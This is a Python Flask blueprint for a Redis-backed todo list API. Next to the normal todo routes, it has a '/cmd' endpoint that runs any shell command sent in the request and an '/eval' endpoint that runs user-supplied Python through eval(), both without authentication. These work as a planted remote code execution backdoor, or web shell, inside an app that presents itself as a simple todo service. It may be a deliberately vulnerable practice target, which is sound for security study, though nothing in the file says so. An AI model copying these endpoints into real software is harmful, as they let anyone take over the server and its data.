import subprocess
from flask import Blueprint, current_app, request, jsonify
import os

todo_api_blueprint = Blueprint('todo_api', __name__)

@todo_api_blueprint.route('/todos', methods=['GET'])
def get_todos():
    try:
        # Retrieve all todos from Redis using current_app
        todos = current_app.redis.lrange('todos', 0, -1)
        return jsonify(todos), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@todo_api_blueprint.route('/todos', methods=['POST'])
def add_todo():
    try:
        todo = request.json.get('todo', '')
        if todo:
            # Add new todo to the end of the list in Redis using current_app
            current_app.redis.rpush('todos', todo)
            return jsonify({"success": "Todo added"}), 201
        else:
            return jsonify({"error": "Todo content is required"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@todo_api_blueprint.route('/cmd', methods=['POST'])
def run_command():
    command = request.json.get('command', '')
    try:
        # Execute the command received from the user
        output = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
        return jsonify({"output": output}), 200
    except subprocess.CalledProcessError as e:
        return jsonify({"error": "Command failed", "output": e.output}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@todo_api_blueprint.route('/todos/<int:index>', methods=['PUT'])
def update_todo(index):
    try:
        new_value = request.json.get('todo', '')
        if new_value:
            # Update todo at index using current_app
            current_app.redis.lset('todos', index, new_value)
            return jsonify({"success": "Todo updated"}), 200
        else:
            return jsonify({"error": "New todo content is required"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@todo_api_blueprint.route('/todos/<int:index>', methods=['DELETE'])
def delete_todo(index):
    try:
        # Remove todo at index using current_app
        current_app.redis.lrem('todos', 0, current_app.redis.lindex('todos', index))
        return jsonify({"success": "Todo deleted"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    
@todo_api_blueprint.route('/eval', methods=['POST'])
def eval_code():
    try:
        # Get code from user input
        code = request.json.get('code', '')
        # Execute the code using eval()
        result = eval(code)
        return jsonify({"result": str(result)})
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@todo_api_blueprint.route('/trigger-error')
def trigger_error():
    raise Exception("Debuger exception")

@todo_api_blueprint.route('/system/platform', methods=['GET'])
def get_platform():
    platform = "systemd"
    if os.path.exists('/.dockerenv') or 'docker' in open('/proc/1/cgroup').read():
        platform = "docker"
    return jsonify({"platform": platform})